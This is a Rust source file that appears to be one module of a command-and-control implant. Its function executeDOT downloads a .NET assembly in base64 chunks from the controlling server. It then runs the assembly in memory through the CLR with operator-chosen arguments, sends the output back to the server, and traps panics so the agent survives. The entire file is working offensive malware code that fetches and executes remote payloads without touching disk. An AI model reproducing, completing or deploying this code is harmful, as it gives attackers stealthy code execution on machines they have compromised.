use clroxide::clr::Clr;
use std::{env, fs, process::exit};

use serde::Deserialize;
use serde_json::{Value, json};
use base64::engine::general_purpose;
use base64::Engine;
use std::io::{Cursor, Read};
const CHUNK_SIZE: usize = 4096;
use std::path::PathBuf;


#[derive(Deserialize)]
struct UploadParams {
    file_id: String,
    parameters: String,
}

pub fn executeDOT(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    // 1. Extract fields
    let id = task.get("id").and_then(Value::as_str).ok_or("Missing `id`")?;
    let raw = task.get("parameters").and_then(Value::as_str).ok_or("Missing `parameters`")?;
    let params: UploadParams = serde_json::from_str(raw)?;
    let file_id = &params.file_id;
    
    // 2. Download chunks into buffer
    let mut file_bytes = Vec::new();
    let mut chunk_num = 1;
    let mut total_chunks = 1;

    while chunk_num <= total_chunks {
        let payload = json!({
            "action": "post_response",
            "responses": [{
                "upload": {
                    "chunk_size": CHUNK_SIZE,
                    "file_id": file_id,
                    "chunk_num": chunk_num
                },
                "task_id": id
            }]
        })
        .to_string();
        let resp: Value = crate::transport::send_request_with_response(&payload)?;
        let entry = &resp["responses"][0];
        total_chunks = entry["total_chunks"].as_u64().ok_or("Bad `total_chunks`")? as usize;
        let chunk_data = entry["chunk_data"].as_str().ok_or("Missing `chunk_data`")?;
        let bytes = general_purpose::STANDARD.decode(chunk_data)?;
        file_bytes.extend_from_slice(&bytes);
        chunk_num += 1;
    }



    let args: Vec<String> = params.parameters
    .split_whitespace()
    .map(|s| s.to_string())
    .collect();

    // Run CLR inside catch_unwind so a panic from the loaded assembly
    // doesn't unwind through the agent and kill the whole process.
    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| -> Result<String, Box<dyn std::error::Error>> {
        let mut clr = Clr::new(file_bytes, args)?;
        let output = clr.run()?;
        Ok(output)
    }));

    let (results, status) = match result {
        Ok(Ok(output)) => (output, "success"),
        Ok(Err(e)) => (format!("DOT execution error: {:?}", e), "error"),
        Err(panic_info) => {
            let msg = if let Some(s) = panic_info.downcast_ref::<&str>() {
                format!("DOT execution panicked: {}", s)
            } else if let Some(s) = panic_info.downcast_ref::<String>() {
                format!("DOT execution panicked: {}", s)
            } else {
                "DOT execution panicked (unknown cause)".to_string()
            };
            (msg, "error")
        }
    };

    // 4. Send final response — always reached, even on error/panic
    let done = json!({
        "action": "post_response",
        "responses": [{
            "task_id": id,
            "user_output": results,
            "agent_file_id": file_id,
            "status": status
        }]
    })
    .to_string();
    crate::transport::send_request(&done)?;
    Ok(())
}

